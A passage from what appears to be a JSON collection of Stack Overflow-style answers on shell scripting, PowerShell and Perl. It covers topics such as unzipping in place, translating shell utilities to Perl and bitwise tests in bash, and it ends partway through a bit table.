    "How to make powershell tell me about missing DLLs?": "I was having this same problem. PowerShell was setting $LASTEXITCODE code to -1073741515 (0xC0000142, 3221225794) but no output explaining what was actually wrong. When running it via cmd.exe I would get popup with something like:\nThe code execution cannot proceed because some.dll was not found. Reinstalling the program may fix this problem.\ncygwin bash outputs errors relating to dll not found to stderr and if you run the the same via bash from PowerShell then you can see the error:\n> & 'C:\\tools\\cygwin\\bin\\bash.exe' '-c' '\"C:/Users/xxx/dir/main.exe\"'\nC:/Users/xxx/dir/main.exe: error while loading shared libraries: another.dll: cannot open shared object file: No such file or directory\nThis works with git bash also:\n> & 'C:\\Program Files\\Git\\bin\\bash.exe' '-c' '\"C:/Users/xxx/dir/main.exe\"'\nC:/Users/xxx/dir/main.exe: error while loading shared libraries: another.dll: cannot open shared object file: No such file or directory\nQuite a hack but better than nothing.",
    "Loop from start date to end date in Mac OS X shell script": "Read your date's manpage by running man date and look at the -v option. Here is an excerpt:\n-v Adjust (i.e., take the current date and display the result of the adjustment; not actually set the date) the second, minute, hour, month day, week day, month or year according to val. If val is preceded with a plus or minus sign, the date is adjusted forwards or backwards according to the remaining string, otherwise the relevant part of the date is set. The date can be adjusted as many times as required using these flags. Flags are processed in the order given.",
    "Find all zips, and unzip in place - Unix [closed]": "find . -name '*.zip' -exec sh -c 'unzip -d `dirname {}` {}' ';'\nThis command looks in current directory and in its subdirectories recursively for files with names matching *.zip pattern. For file found it executes command sh with two parameters:\n-c\nand\nunzip -d `dirname <filename>` <filename>\nWhere <filename> is name of file that was found. Command sh is Unix shell interpreter. Option -c tells shell that next argument should be interpreted as shell script. So shell interprets the following script:\nunzip -d `dirname <filename>` <filename>\nBefore running unzip shell expands the command, by doing various substitutions. In this particular example it substitutes\n`dirname <filename>`\nwith output of command dirname <filename> which actually outputs directory name where file is placed. So, if file name is ./a/b/c/d.zip, shell will run unzip like this:\nunzip -d ./a/b/c ./a/b/c/d.zip\nIn case you ZIP file names or directory names have spaces, use this:\nfind . -name '*.zip' -exec sh -c 'unzip -d \"`dirname \\\"{}\\\"`\" \"{}\"' ';'",
    "How can I translate a shell script to Perl?": "I'll answer seriously. I do not know of any program to translate a shell script into Perl, and I doubt any interpreter module would provide the performance benefits. So I'll give an outline of how I would go about it.\nNow, you want to reuse your code as much as possible. In that case, I suggest selecting pieces of that code, write a Perl version of that, and then call the Perl script from the main script. That will enable you to do the conversion in small steps, assert that the converted part is working, and improve gradually your Perl knowledge.\nAs you can call outside programs from a Perl script, you can even replace some bigger logic with Perl, and call smaller shell scripts (or other commands) from Perl to do something you don't feel comfortable yet to convert. So you'll have a shell script calling a perl script calling another shell script. And, in fact, I did exactly that with my own very first Perl script.\nOf course, it's important to select well what to convert. I'll explain, below, how many patterns common in shell scripts are written in Perl, so that you can identify them inside your script, and create replacements by as much cut&paste as possible.\nFirst, both Perl scripts and Shell scripts are code+functions. Ie, anything which is not a function declaration is executed in the order it is encountered. You don't need to declare functions before use, though. That means the general layout of the script can be preserved, though the ability to keep things in memory (like a whole file, or a processed form of it) makes it possible to simplify tasks.\nA Perl script, in Unix, starts with something like this:\n#!/usr/bin/perl\n\nuse strict;\nuse warnings;\n\nuse Data::Dumper;\n#other libraries\n\n(rest of the code)\nThe first line, obviously, points to the commands to be used to run the script, just like normal shells do. The following two \"use\" lines make then language more strict, which should decrease the amount of bugs you encounter because you don't know the language well (or plain did something wrong). The third use line imports the \"Dumper\" function of the \"Data\" module. It's useful for debugging purposes. If you want to know the value of an array or hash table, just print Dumper(whatever).\nNote also that comments are just like shell's, lines starting with \"#\".\nNow, you call external programs and pipe to or pipe from them. For example:\nopen THIS, \"cat $ARGV[0] |\";\nThat will run cat, passing \"$ARGV[0]\", which would be $1 on shell -- the first argument passed to it. The result of that will be piped into your Perl script through \"THIS\", which you can use to read that from it, as I'll show later.\nYou can use \"|\" at the beginning or end of line, to indicate the mode \"pipe to\" or \"pipe from\", and specify a command to be run, and you can also use \">\" or \">>\" at the beginning, to open a file for writing with or without truncation, \"<\" to explicitly indicate opening a file for reading (the default), or \"+<\" and \"+>\" for read and write. Notice that the later will truncate the file first.\nAnother syntax for \"open\", which will avoid problems with files with such characters in their names, is having the opening mode as a second argument:\nopen THIS, \"-|\", \"cat $ARGV[0]\";\nThis will do the same thing. The mode \"-|\" stands for \"pipe from\" and \"|-\" stands for \"pipe to\". The rest of the modes can be used as they were (>, >>, <, +>, +<). While there is more than this to open, it should suffice for most things.\nBut you should avoid calling external programs as much as possible. You could open the file directly, by doing open THIS, \"$ARGV[0]\";, for example, and have much better performance.\nSo, what external programs you could cut out? Well, almost everything. But let's stay with the basics: cat, grep, cut, head, tail, uniq, wc, sort.\nCAT\nWell, there isn't much to be said about this one. Just remember that, if possible, read the file only once and keep it in memory. If the file is huge you won't do that, of course, but there are almost always ways to avoid reading a file more than once.\nAnyway, the basic syntax for cat would be:\nmy $filename = \"whatever\";\nopen FILE, \"$filename\" or die \"Could not open $filename!\\n\";\nwhile(<FILE>) {\n  print $_;\n}\nclose FILE;\nThis opens a file, and prints all it's contents (\"while(<FILE>)\" will loop until EOF, assigning each line to \"$_\"), and close it again.\nIf I wanted to direct the output to another file, I could do this:\nmy $filename = \"whatever\";\nmy $anotherfile = \"another\";\nopen (FILE, \"$filename\") || die \"Could not open $filename!\\n\";\nopen OUT, \">\", \"$anotherfile\" or die \"Could not open $anotherfile for writing!\\n\";\nwhile(<FILE>) {\n  print OUT $_;\n}\nclose FILE;\nThis will print the line to the file indicated by \"OUT\". You can use STDIN, STDOUT and STDERR in the appropriate places as well, without having to open them first. In fact, \"print\" defaults to STDOUT, and \"die\" defaults to \"STDERR\".\nNotice also the \"or die ...\" and \"|| die ...\". The operators or and || means it will only execute the following command if the first returns false (which means empty string, null reference, 0, and the like). The die command stops the script with an error message.\nThe main difference between \"or\" and \"||\" is priority. If \"or\" was replaced by \"||\" in the examples above, it would not work as expected, because the line would be interpreted as:\nopen FILE, (\"$filename\" || die \"Could not open $filename!\\n\");\nWhich is not at all what is expected. As \"or\" has a lower priority, it works. In the line where \"||\" is used, the parameters to open are passed between parenthesis, making it possible to use \"||\".\nAlas, there is something which is pretty much what cat does:\nwhile(<>) {\n  print $_;\n}\nThat will print all files in the command line, or anything passed through STDIN.\nGREP\nSo, how would our \"grep\" script work? I'll assume \"grep -E\", because that's easier in Perl than simple grep. Anyway:\nmy $pattern = $ARGV[0];\nshift @ARGV;\nwhile(<>) {\n        print $_ if /$pattern/o;\n}\nThe \"o\" passed to $patttern instructs Perl to compile that pattern only once, thus gaining you speed. Not the style \"something if cond\". It means it will only execute \"something\" if the condition is true. Finally, \"/$pattern/\", alone, is the same as \"$_ =~ m/$pattern/\", which means compare $_ with the regex pattern indicated. If you want standard grep behavior, ie, just substring matching, you could write:\nprint $_ if $_ =~ \"$pattern\";\nCUT\nUsually, you do better using regex groups to get the exact string than cut. What you would do with \"sed\", for instance. Anyway, here are two ways of reproducing cut:\nwhile(<>) {\n  my @array = split \",\";\n  print $array[3], \"\\n\";\n}\nThat will get you the fourth column of every line, using \",\" as separator. Note @array and $array[3]. The @ sigil means \"array\" should be treated as an, well, array. It will receive an array composed of each column in the currently processed line. Next, the $ sigil means array[3] is a scalar value. It will return the column you are asking for.\nThis is not a good implementation, though, as \"split\" will scan the whole string. I once reduced a process from 30 minutes to 2 seconds just by not using split -- the lines where rather large, though. Anyway, the following has a superior performance if the lines are expected to be big, and the columns you want are low:\nwhile(<>) {\n  my ($column) = /^(?:[^,]*,){3}([^,]*),/;\n  print $column, \"\\n\";\n}\nThis leverages regular expressions to get the desired information, and only that.\nIf you want positional columns, you can use:\nwhile(<>) {\n  print substr($_, 5, 10), \"\\n\";\n}\nWhich will print 10 characters starting from the sixth (again, 0 means the first character).\nHEAD\nThis one is pretty simple:\nmy $printlines = abs(shift);\nmy $lines = 0;\nmy $current;\nwhile(<>) {\n  if($ARGV ne $current) {\n    $lines = 0;\n    $current = $ARGV;\n  }\n  print \"$_\" if $lines < $printlines;\n  $lines++;\n}\nThings to note here. I use \"ne\" to compare strings. Now, $ARGV will always point to the current file, being read, so I keep track of them to restart my counting once I'm reading a new file. Also note the more traditional syntax for \"if\", right along with the post-fixed one.\nI also use a simplified syntax to get the number of lines to be printed. When you use \"shift\" by itself it will assume \"shift @ARGV\". Also, note that shift, besides modifying @ARGV, will return the element that was shifted out of it.\nAs with a shell, there is no distinction between a number and a string -- you just use it. Even things like \"2\"+\"2\" will work. In fact, Perl is even more lenient, cheerfully treating anything non-number as a 0, so you might want to be careful there.\nThis script is very inefficient, though, as it reads ALL file, not only the required lines. Let's improve it, and see a couple of important keywords in the process:\nmy $printlines = abs(shift);\nmy @files;\nif(scalar(@ARGV) == 0) {\n  @files = (\"-\");\n} else {\n  @files = @ARGV;\n}\nfor my $file (@files) {\n  next unless -f $file && -r $file;\n  open FILE, \"<\", $file or next;\n  my $lines = 0;\n\n  while(<FILE>) {\n    last if $lines == $printlines;\n    print \"$_\";\n    $lines++;\n  }\n\n  close FILE;\n}\nThe keywords \"next\" and \"last\" are very useful. First, \"next\" will tell Perl to go back to the loop condition, getting the next element if applicable. Here we use it to skip a file unless it is truly a file (not a directory) and readable. It will also skip if we couldn't open the file even then.\nThen \"last\" is used to immediately jump out of a loop. We use it to stop reading the file once we have reached the required number of lines. It's true we read one line too many, but having \"last\" in that position shows clearly that the lines after it won't be executed.\nThere is also \"redo\", which will go back to the beginning of the loop, but without reevaluating the condition nor getting the next element.\nTAIL\nI'll do a little trick here.\nmy $skiplines = abs(shift);\nmy @lines;\nmy $current = \"\";\nwhile(<>) {\n  if($ARGV ne $current) {\n    print @lines;\n    undef @lines;\n    $current = $ARGV;\n  }\n  push @lines, $_;\n  shift @lines if $#lines == $skiplines;\n}\nprint @lines;\nOk, I'm combining \"push\", which appends a value to an array, with \"shift\", which takes something from the beginning of an array. If you want a stack, you can use push/pop or shift/unshift. Mix them, and you have a queue. I keep my queue with at most 10 elements with $#lines which will give me the index of the last element in the array. You could also get the number of elements in @lines with scalar(@lines).\nUNIQ\nNow, uniq only eliminates repeated consecutive lines, which should be easy with what you have seen so far. So I'll eliminate all of them:\nmy $current = \"\";\nmy %lines;\nwhile(<>) {\n  if($ARGV ne $current) {\n    undef %lines;\n    $current = $ARGV;\n  }\n  print $_ unless defined($lines{$_});\n  $lines{$_} = \"\";\n}\nNow here I'm keeping the whole file in memory, inside %lines. The use of the % sigil indicates this is a hash table. I'm using the lines as keys, and storing nothing as value -- as I have no interest in the values. I check where the key exist with \"defined($lines{$_})\", which will test if the value associated with that key is defined or not; the keyword \"unless\" works just like \"if\", but with the opposite effect, so it only prints a line if the line is NOT defined.\nNote, too, the syntax $lines{$_} = \"\" as a way to store something in a hash table. Note the use of {} for hash table, as opposed to [] for arrays.\nWC\nThis will actually use a lot of stuff we have seen:\nmy $current;\nmy %lines;\nmy %words;\nmy %chars;\nwhile(<>) {\n  $lines{\"$ARGV\"}++;\n  $chars{\"$ARGV\"} += length($_);\n  $words{\"$ARGV\"} += scalar(grep {$_ ne \"\"} split /\\s/);\n}\n\nfor my $file (keys %lines) {\n  print \"$lines{$file} $words{$file} $chars{$file} $file\\n\";\n}\nThree new things. Two are the \"+=\" operator, which should be obvious, and the \"for\" expression. Basically, a \"for\" will assign each element of the array to the variable indicated. The \"my\" is there to declare the variable, though it's unneeded if declared previously. I could have an @array variable inside those parenthesis. The \"keys %lines\" expression will return as an array they keys (the filenames) which exist for the hash table \"%lines\". The rest should be obvious.\nThe third thing, which I actually added only revising the answer, is the \"grep\". The format here is:\ngrep { code } array\nIt will run \"code\" for each element of the array, passing the element as \"$_\". Then grep will return all elements for which the code evaluates to \"true\" (not 0, not \"\", etc). This avoids counting empty strings resulting from consecutive spaces.\nSimilar to \"grep\" there is \"map\", which I won't demonstrate here. Instead of filtering, it will return an array formed by the results of \"code\" for each element.\nSORT\nFinally, sort. This one is easy too:\nmy @lines;\nmy $current = \"\";\nwhile(<>) {\n  if($ARGV ne $current) {\n    print sort @lines;\n    undef @lines;\n    $current = $ARGV;\n  }\n  push @lines, $_;\n}\nprint sort @lines;\nHere, \"sort\" will sort the array. Note that sort can receive a function to define the sorting criteria. For instance, if I wanted to sort numbers I could do this:\nmy @lines;\nmy $current = \"\";\nwhile(<>) {\n  if($ARGV ne $current) {\n    print sort @lines;\n    undef @lines;\n    $current = $ARGV;\n  }\n  push @lines, $_;\n}\nprint sort {$a <=> $b} @lines;\nHere \"$a\" and \"$b\" receive the elements to be compared. \"<=>\" returns -1, 0 or 1 depending on whether the number is less than, equal to or greater than the other. For strings, \"cmp\" does the same thing.\nHANDLING FILES, DIRECTORIES & OTHER STUFF\nAs for the rest, basic mathematical expressions should be easy to understand. You can test certain conditions about files this way:\nfor my $file (@ARGV) {\n  print \"$file is a file\\n\" if -f \"$file\";\n  print \"$file is a directory\\n\" if -d \"$file\";\n  print \"I can read $file\\n\" if -r \"$file\";\n  print \"I can write to $file\\n\" if -w \"$file\";\n}\nI'm not trying to be exaustive here, there are many other such tests. I can also do \"glob\" patterns, like shell's \"*\" and \"?\", like this:\nfor my $file (glob(\"*\")) {\n  print $file;\n  print \"*\" if -x \"$file\" && ! -d \"$file\";\n  print \"/\" if -d \"$file\";\n  print \"\\t\";\n}\nIf you combined that with \"chdir\", you can emulate \"find\" as well:\nsub list_dir($$) {\n  my ($dir, $prefix) = @_;\n  my $newprefix = $prefix;\n  if ($prefix eq \"\") {\n    $newprefix = $dir;\n  } else {\n    $newprefix .= \"/$dir\";\n  }\n  chdir $dir;\n  for my $file (glob(\"*\")) {\n    print \"$prefix/\" if $prefix ne \"\";\n    print \"$dir/$file\\n\";\n    list_dir($file, $newprefix) if -d \"$file\";\n  }\n  chdir \"..\";\n}\n\nlist_dir(\".\", \"\");\nHere we see, finally, a function. A function is declared with the syntax:\nsub name (params) { code }\nStrictly speakings, \"(params)\" is optional. The declared parameter I used, \"($$)\", means I'm receiving two scalar parameters. I could have \"@\" or \"%\" in there as well. The array \"@_\" has all the parameters passed. The line \"my ($dir, $prefix) = @_\" is just a simple way of assigning the first two elements of that array to the variables $dir and $prefix.\nThis function does not return anything (it's a procedure, really), but you can have functions which return values just by adding \"return something;\" to it, and have it return \"something\".\nThe rest of it should be pretty obvious.\nMIXING EVERYTHING\nNow I'll present a more involved example. I'll show some bad code to explain what's wrong with it, and then show better code.\nFor this first example, I have two files, the names.txt file, which names and phone numbers, the systems.txt, with systems and the name of the responsible for them. Here they are:\nnames.txt\nJohn Doe, (555) 1234-4321\nJane Doe, (555) 5555-5555\nThe Boss, (666) 5555-5555\nsystems.txt\nSales, Jane Doe\nInventory, John Doe\nPayment, That Guy\nI want, then, to print the first file, with the system appended to the name of the person, if that person is responsible for that system. The first version might look like this:\n#!/usr/bin/perl\n\nuse strict;\nuse warnings;\n\nopen FILE, \"names.txt\";\n\nwhile(<FILE>) {\n  my ($name) = /^([^,]*),/;\n  my $system = get_system($name);\n  print $_ . \", $system\\n\";\n}\n\nclose FILE;\n\nsub get_system($) {\n  my ($name) = @_;\n  my $system = \"\";\n\n  open FILE, \"systems.txt\";\n\n  while(<FILE>) {\n    next unless /$name/o;\n    ($system) = /([^,]*)/;\n  }\n\n  close FILE;\n\n  return $system;\n}\nThis code won't work, though. Perl will complain that the function was used too early for the prototype to be checked, but that's just a warning. It will give an error on line 8 (the first while loop), complaining about a readline on a closed filehandle. What happened here is that \"FILE\" is global, so the function get_system is changing it. Let's rewrite it, fixing both things:\n#!/usr/bin/perl\n\nuse strict;\nuse warnings;\n\nsub get_system($) {\n  my ($name) = @_;\n  my $system = \"\";\n\n  open my $filehandle, \"systems.txt\";\n\n  while(<$filehandle>) {\n    next unless /$name/o;\n    ($system) = /([^,]*)/;\n  }\n\n  close $filehandle;\n\n  return $system;\n}\n\nopen FILE, \"names.txt\";\n\nwhile(<FILE>) {\n  my ($name) = /^([^,]*),/;\n  my $system = get_system($name);\n  print $_ . \", $system\\n\";\n}\n\nclose FILE;\nThis won't give any error or warnings, nor will it work. It returns just the sysems, but not the names and phone numbers! What happened? Well, what happened is that we are making a reference to \"$_\" after calling get_system, but, by reading the file, get_system is overwriting the value of $_!\nTo avoid that, we'll make $_ local inside get_system. This will give it a local scope, and the original value will then be restored once returned from get_system:\n#!/usr/bin/perl\n\nuse strict;\nuse warnings;\n\nsub get_system($) {\n  my ($name) = @_;\n  my $system = \"\";\n  local $_;\n\n  open my $filehandle, \"systems.txt\";\n\n  while(<$filehandle>) {\n    next unless /$name/o;\n    ($system) = /([^,]*)/;\n  }\n\n  close $filehandle;\n\n  return $system;\n}\n\nopen FILE, \"names.txt\";\n\nwhile(<FILE>) {\n  my ($name) = /^([^,]*),/;\n  my $system = get_system($name);\n  print $_ . \", $system\\n\";\n}\n\nclose FILE;\nAnd that still doesn't work! It prints a newline between the name and the system. Well, Perl reads the line including any newline it might have. There is a neat command which will remove newlines from strings, \"chomp\", which we'll use to fix this problem. And since not every name has a system, we might, as well, avoid printing the comma when that happens:\n#!/usr/bin/perl\n\nuse strict;\nuse warnings;\n\nsub get_system($) {\n  my ($name) = @_;\n  my $system = \"\";\n  local $_;\n\n  open my $filehandle, \"systems.txt\";\n\n  while(<$filehandle>) {\n    next unless /$name/o;\n    ($system) = /([^,]*)/;\n  }\n\n  close $filehandle;\n\n  return $system;\n}\n\nopen FILE, \"names.txt\";\n\nwhile(<FILE>) {\n  my ($name) = /^([^,]*),/;\n  my $system = get_system($name);\n  chomp;\n  print $_;\n  print \", $system\" if $system ne \"\";\n  print \"\\n\";\n}\n\nclose FILE;\nThat works, but it also happens to be horribly inefficient. We read the whole systems file for every line in the names file. To avoid that, we'll read all data from systems once, and then use that to process names.\nNow, sometimes a file is so big you can't read it into memory. When that happens, you should try to read into memory any other file needed to process it, so that you can do everything in a single pass for each file. Anyway, here is the first optimized version of it:\n#!/usr/bin/perl\n\nuse strict;\nuse warnings;\n\nour %systems;\nopen SYSTEMS, \"systems.txt\";\nwhile(<SYSTEMS>) {\n  my ($system, $name) = /([^,]*),(.*)/;\n  $systems{$name} = $system;\n}\nclose SYSTEMS;\n\nopen NAMES, \"names.txt\";\nwhile(<NAMES>) {\n  my ($name) = /^([^,]*),/;\n  chomp;\n  print $_;\n  print \", $systems{$name}\" if defined $systems{$name};\n  print \"\\n\";\n}\nclose NAMES;\nUnfortunately, it doesn't work. No system ever appears! What has happened? Well, let's look into what \"%systems\" contains, by using Data::Dumper:\n#!/usr/bin/perl\n\nuse strict;\nuse warnings;\n\nuse Data::Dumper;\n\nour %systems;\nopen SYSTEMS, \"systems.txt\";\nwhile(<SYSTEMS>) {\n  my ($system, $name) = /([^,]*),(.*)/;\n  $systems{$name} = $system;\n}\nclose SYSTEMS;\n\nprint Dumper(%systems);\n\nopen NAMES, \"names.txt\";\nwhile(<NAMES>) {\n  my ($name) = /^([^,]*),/;\n  chomp;\n  print $_;\n  print \", $systems{$name}\" if defined $systems{$name};\n  print \"\\n\";\n}\nclose NAMES;\nThe output will be something like this:\n$VAR1 = ' Jane Doe';\n$VAR2 = 'Sales';\n$VAR3 = ' That Guy';\n$VAR4 = 'Payment';\n$VAR5 = ' John Doe';\n$VAR6 = 'Inventory';\nJohn Doe, (555) 1234-4321\nJane Doe, (555) 5555-5555\nThe Boss, (666) 5555-5555\nThose $VAR1/$VAR2/etc is how Dumper displays a hash table. The odd numbers are the keys, and the succeeding even numbers are the values. Now we can see that each name in %systems has a preceeding space! Silly regex mistake, let's fix it:\n#!/usr/bin/perl\n\nuse strict;\nuse warnings;\n\nour %systems;\nopen SYSTEMS, \"systems.txt\";\nwhile(<SYSTEMS>) {\n  my ($system, $name) = /^\\s*([^,]*?)\\s*,\\s*(.*?)\\s*$/;\n  $systems{$name} = $system;\n}\nclose SYSTEMS;\n\nopen NAMES, \"names.txt\";\nwhile(<NAMES>) {\n  my ($name) = /^\\s*([^,]*?)\\s*,/;\n  chomp;\n  print $_;\n  print \", $systems{$name}\" if defined $systems{$name};\n  print \"\\n\";\n}\nclose NAMES;\nSo, here, we are aggressively removing any spaces from the beginning or end of name and system. There are other ways to form that regex, but that's beside the point. There is still one problem with this script, which you'll have seen if your \"names.txt\" and/or \"systems.txt\" files have an empty line at the end. The warnings look like this:\nUse of uninitialized value in hash element at ./exemplo3e.pl line 10, <SYSTEMS> line 4.\nUse of uninitialized value in hash element at ./exemplo3e.pl line 10, <SYSTEMS> line 4.\nJohn Doe, (555) 1234-4321, Inventory\nJane Doe, (555) 5555-5555, Sales\nThe Boss, (666) 5555-5555\nUse of uninitialized value in hash element at ./exemplo3e.pl line 19, <NAMES> line 4.\nWhat happened here is that nothing went into the \"$name\" variable when the empty line was processed. There are many ways around that, but I choose the following:\n#!/usr/bin/perl\n\nuse strict;\nuse warnings;\n\nour %systems;\nopen SYSTEMS, \"systems.txt\" or die \"Could not open systems.txt!\";\nwhile(<SYSTEMS>) {\n  my ($system, $name) = /^\\s*([^,]+?)\\s*,\\s*(.+?)\\s*$/;\n  $systems{$name} = $system if defined $name;\n}\nclose SYSTEMS;\n\nopen NAMES, \"names.txt\" or die \"Could not open names.txt!\";\nwhile(<NAMES>) {\n  my ($name) = /^\\s*([^,]+?)\\s*,/;\n  chomp;\n  print $_;\n  print \", $systems{$name}\" if defined($name) && defined($systems{$name});\n  print \"\\n\";\n}\nclose NAMES;\nThe regular expressions now require at least one character for name and system, and we test to see if \"$name\" is defined before we use it.\nCONCLUSION\nWell, then, these are the basic tools to translate a shell script. You can do MUCH more with Perl, but that was not your question, and it wouldn't fit here anyway.\nJust as a basic overview of some important topics,\nA Perl script that might be attacked by hackers need to be run with the -T option, so that Perl will complain about any vulnerable input which has not been properly handled.\nThere are libraries, called modules, for database accesses, XML&cia handling, Telnet, HTTP & other protocols. In fact, there are miriads of modules which can be found at CPAN.\nAs mentioned by someone else, if you make use of AWK or SED, you can translate those into Perl with A2P and S2P.\nPerl can be written in an Object Oriented way.\nThere are multiple versions of Perl. As of this writing, the stable one is 5.8.8 and there is a 5.10.0 available. There is also a Perl 6 in development, but experience has taught everyone not to wait too eagerly for it.\nThere is a free, good, hands-on, hard & fast book about Perl called Learning Perl The Hard Way. It's style is similar to this very answer. It might be a good place to go from here.\nI hope this helped.\nDISCLAIMER\nI'm NOT trying to teach Perl, and you will need to have at least some reference material. There are guidelines to good Perl habits, such as using \"use strict;\" and \"use warnings;\" at the beginning of the script, to make it less lenient of badly written code, or using STDOUT and STDERR on the print lines, to indicate the correct output pipe.\nThis is stuff I agree with, but I decided it would detract from the basic goal of showing patterns for common shell script utilities.",
    "Why doesn't **find** find anything?": "Try quoting the wildcard:\n$ find /usr -name \\*.sh\nor:\n$ find /usr -name '*.sh'\nIf you happen to have a file that matches *.sh in the current working directory, the wildcard will be expanded before find sees it. If you happen to have a file named tkConfig.sh in your working directory, the find command would expand to:\n$ find /usr -name tkConfig.sh\nwhich would only find files named tkConfig.sh. If you had more than one file that matches *.sh, you'd get a syntax error from find:\n$ cd /usr/local/lib\n$ find /usr -name *.sh\nfind: bad option tkConfig.sh\nfind: path-list predicate-list\nAgain, the reason is that the wildcard expands to both files:\n$ find /usr -name tclConfig.sh tkConfig.sh\nQuoting the wildcard prevents it from being prematurely expanded.\nAnother possibility is that /usr or one of its subdirectories is a symlink. find doesn't normally follow links, so you might need the -follow option:\n$ find /usr -follow -name '*.sh'",
    "Shell command/script to delete files whose names are in a text file": "while read -r filename; do\n  rm \"$filename\"\ndone <list.txt\nis slow.\nrm $(<list.txt)\nwill fail if there are too many arguments.\nI think it should work:\nxargs -a list.txt -d'\\n' rm",
    "How to obtain public ip address using windows command prompt?": "Use the Invoke-WebRequest module in powershell. For example:\nInvoke-WebRequest ifconfig.me/ip\nGo to source\nEdit: I misread the question and thought you needed to use Powershell, there is no built in command in cmd.exe to return a public IP address, but you can use nslookup to resolve it, like so;\nnslookup myip.opendns.com. resolver1.opendns.com\nAnother option for the OP:\ntelnet curlmyip.com 80\nType GET after you are connected.\nNote: telnet is not installed/enabled by default on Windows.\nGo to source",
    "Bash script: difference in minutes between two times": "A pure\nbash\nsolution :\nold=09:11\nnew=17:22\n\n# feeding variables by using read and splitting with IFS\nIFS=: read old_hour old_min <<< \"$old\"\nIFS=: read hour min <<< \"$new\"\n\n# convert hours to minutes\n# the 10# is there to avoid errors with leading zeros\n# by telling bash that we use base 10\ntotal_old_minutes=$((10#$old_hour*60 + 10#$old_min))\ntotal_minutes=$((10#$hour*60 + 10#$min))\n\necho \"the difference is $((total_minutes - total_old_minutes)) minutes\"\nAnother solution using date (we work with hour/minutes, so the date is not important)\nold=09:11\nnew=17:22\n\nIFS=: read old_hour old_min <<< \"$old\"\nIFS=: read hour min <<< \"$new\"\n\n# convert the date \"1970-01-01 hour:min:00\" in seconds from Unix EPOCH time\nsec_old=$(date -d \"1970-01-01 $old_hour:$old_min:00\" +%s)\nsec_new=$(date -d \"1970-01-01 $hour:$min:00\" +%s)\n\necho \"the difference is $(( (sec_new - sec_old) / 60)) minutes\"\nSee http://en.wikipedia.org/wiki/Unix_time",
    "Checking if directory in HDFS already exists or not": "Try w/o test command []:\nif $(hadoop fs -test -d $yourdir) ; then echo \"ok\";else echo \"not ok\"; fi",
    "Shell: get lines x to y of file": "You can use sed:\nsed -n '5,10p' filename\nto print lines from 5 to 10.",
    "How to use bitwise operators in if statements?": "Logic vs Syntax\n.... or: \"What's more to say?\"\nAt first sight, as pointed out in @chepner's comment, the question might only be one of syntax, which causes the compilation error (unexpected token '&', conditional binary operator expected). And in fact, @kev's answer addresses that by using arithmetic expansion, which is applied to the If statement in @Gustavo's answer.\nHowever, the question \"how to use bitwise operators in if statements\" is formulated in a more general manner and begs for an answer on how to use bitwise operators to check against $MASK (It was not the question of \"how to avoid a syntax error when using binary comparison\").\nIn fact, it may be assumed that the example code\nif [[ ( releases[\"token\"] & $MASK ) -eq 1 ]]; then\nwas a work in progress of finding a solution and is explicitly marked as \"something like ...\". Now @kev's arbitrary assumption of\n releases[\"token\"]=3\n MASK=5\nmight hide the fact, that there is also a logical misunderstanding in using -eq 1 in the first place. So while @kev's answer works with the chosen values, the result of the input of e.g. 4 line in\n (((5&4)==1)) && echo YES || echo NO\nwould print NO, even though one would expect YES in that case as well, as 4 and 5 both have the 3rd bit set.\nSo this answer addresses this logical error in the questions example and attempts an general answer the the question's headline.\n\nFirst things first!\n... or: \"The Background of Bitwise Representation\"\nto understand bitwise comparison it is helpful to visualise numbers in their bit representation (listed top-down in the following example):\n|-----------------------------------------------------------|\n|         |     hexadecimal representation of the value     |\n| bit val |  0  1  2  3  4  5  6  7  8  9  A  B  C  D  E  F |\n|---------|---------------------- bit ----------------------|\n|         |  shows if the given value has the given bit set |\n|  0      |  -  x  -  x  -  x  -  x  -  x  -  x  -  x  -  x |\n|  1      |  -  -  x  x  -  -  x  x  -  -  x  x  -  -  x  x |\n|  2      |  -  -  -  -  x  x  x  x  -  -  -  -  x  x  x  x |\n|  3      |  -  -  -  -  -  -  -  -  x  x  x  x  x  x  x  x |\n|---------|---------------------- val ----------------------|\n|     shows the value that the given bit adds to the number |\n|  0   1  |  0  1  0  1  0  1  0  1  0  1  0  1  0  1  0  1 |\n|  1   2  |  0  0  2  2  0  0  2  2  0  0  2  2  0  0  2  2 |\n|  2   4  |  0  0  0  0  4  4  4  4  0  0  0  0  4  4  4  4 |\n|  3   8  |  0  0  0  0  0  0  0  0  8  8  8  8  8  8  8  8 |\n|---------|-------------------------------------------------|\n|sum:  15 |  0  1  2  3  4  5  6  7  8  9 10 11 12 13 14 15 |\n|         |       decimal representation of the value       |\n|===========================================================|\nwhich is created by the following snippet:\n( # start a subshell to encapsulate vars for easy copy-paste into the terminal\n  # do not use this in a script!\necho ;\necho \"|-----------------------------------------------------------|\";\necho \"|         |     hexadecimal representation of the value     |\";\necho \"| bit val |  0  1  2  3  4  5  6  7  8  9  A  B  C  D  E  F |\";\necho \"|---------|---------------------- bit ----------------------|\";\necho \"|         |  shows if the given value has the given bit set |\";\nmask=0;\nfor (( bit=0; bit<4; bit++)); do\n    mask=$((1<<bit));\n    echo -n \"|  $bit      |\"\n    for ((x=0;x<16;x++)); do ((((x&mask)>0))&&echo -n '  x'||echo -n '  -'); done\n    echo \" |\";\ndone ;\necho \"|---------|---------------------- val ----------------------|\";\necho \"|     shows the value that the given bit adds to the number |\";\nmask=0;\nfor (( bit=0; bit<4; bit++)); do\n    mask=$((1<<bit));\n    echo -n \"|  $bit   $mask  |\"\n    for ((x=0;x<16;x++)); do echo -n \"  $((x&mask))\"; done\n    echo \" |\";\ndone ;\necho \"|---------|-------------------------------------------------|\";\necho \"|sum:  15 |  0  1  2  3  4  5  6  7  8  9 10 11 12 13 14 15 |\";\necho \"|         |       decimal representation of the value       |\";\necho \"|===========================================================|\";\necho ;\n)\n\nThe curious case of 3 & 5 vs 4 & 5\n... or: \"==1 vs >0 and the Differences of &, |, and ^\"\nif we now check the special case of the examples mentioned, we'll see the shortcoming:\n|------------------ value: 3 / mask: 5 -------------------|\n|         | value | mask  |  and  |  or   |  xor  | xnor  |\n|         |   3   |   5   | 3 & 5 | 3 | 5 | 3 ^ 5 |       |\n| bit val |bit:val|bit:val|bit:val|bit:val|bit:val|bit:val|\n|---------|-------|-------|-------|-------|-------|-------|\n|  0   1  | 1   1 | 1   1 | 1   1 | 1   1 | 0   0 | 0   0 |\n|  1   2  | 2   1 | 0   0 | 0   0 | 1   2 | 1   2 | 1   2 |\n|  2   4  | 0   0 | 4   1 | 0   0 | 1   4 | 1   4 | 1   4 |\n|  3   8  | 0   0 | 0   0 | 0   0 | 0   0 | 0   0 | 0   0 |\n|---------|-------|-------|-------|-------|-------|-------|\n|sum:     |     3 |     5 